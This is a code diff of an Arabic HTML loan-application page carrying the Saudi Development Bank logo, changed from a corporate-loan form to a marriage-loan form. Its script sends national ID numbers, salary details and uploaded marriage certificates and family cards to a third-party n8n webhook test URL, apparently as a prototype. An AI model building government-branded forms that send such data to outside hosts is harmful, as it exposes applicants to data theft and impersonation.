@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>نموذج قرض تميز الشركات</title>
+  <title>نموذج تقديم قرض الزواج</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -106,28 +106,40 @@
     <a href="index.html">
       <img src="https://www.sdb.gov.sa/sdb/media/sdb/sdblogo-ar.png" alt="SDB Logo" />
     </a>
-    <h1>نموذج قرض تميز الشركات</h1>
+    <h1>نموذج تقديم قرض الزواج</h1>
   </header>
 
   <div class="container">
-    <form id="taxForm" enctype="multipart/form-data">
-      <label>صورة الهوية</label>
-      <input type="text" name="entity_name" required>
+    <form id="loanForm" enctype="multipart/form-data">
+      <label>الاسم</label>
+      <input type="text" name="name" required>
 
-      <label>صورة من السجل التجاري</label>
-      <input type="number" name="commercial_id" required>
+      <label>رقم الهوية (10 أرقام)</label>
+      <input type="number" name="id_num" required>
 
-      <label>عقد التأسيس</label>
-      <input type="email" name="email" required>
+      <label>الراتب الأساسي</label>
+      <input type="number" name="main_salary" required>
 
-      <label>قوائم مالية داخلية</label>
-      <input type="text" name="tax_period" required>
+      <label>البدلات</label>
+      <input type="number" name="allowance">
 
-      <label>اقرارات ضريبية</label>
-      <input type="number" name="vat_amount" required>
+      <label>إجمالي الراتب</label>
+      <input type="number" name="total_salary" required>
 
-      <label>رخصة مزاولة النشاط</label>
-      <input type="file" name="tax_declaration_file" accept=".pdf,image/*" required>
+      <label>المسمى الوظيفي</label>
+      <input type="text" name="job_title" required>
+
+      <label>البريد الإلكتروني</label>
+      <input type="email" name="_replyto" required>
+
+      <label>شهادة الزواج</label>
+      <input type="file" name="marriage_certificate" accept=".pdf,image/*" required>
+
+      <label>تعريف بالراتب</label>
+      <input type="file" name="salary_statement" accept=".pdf,image/*" required>
+
+      <label>كرت العائلة</label>
+      <input type="file" name="family_id" accept=".pdf,image/*" required>
 
       <button type="submit">إرسال</button>
 
@@ -138,7 +150,7 @@
   </div>
 
   <script>
-    const form = document.getElementById("taxForm");
+    const form = document.getElementById("loanForm");
     const decisionMessage = document.getElementById("decisionMessage");
 
     form.addEventListener("submit", async function (e) {
@@ -150,7 +162,7 @@
       decisionMessage.innerText = "";
 
       try {
-        const response = await fetch("https://n8n-app-brgahqb8ebeqaxc6.swedencentral-01.azurewebsites.net/webhook-test/97b45703-0fdd-4da5-89a3-0dbfe0f5378d", {
+        const response = await fetch("https://n8n-app-brgahqb8ebeqaxc6.swedencentral-01.azurewebsites.net/webhook-test/06b4d59b-65f6-43f7-b233-f74a58fabbb9", {
           method: "POST",
           body: formData,
         });
@@ -174,3 +186,5 @@
   </script>
 </body>
 </html>
+
+
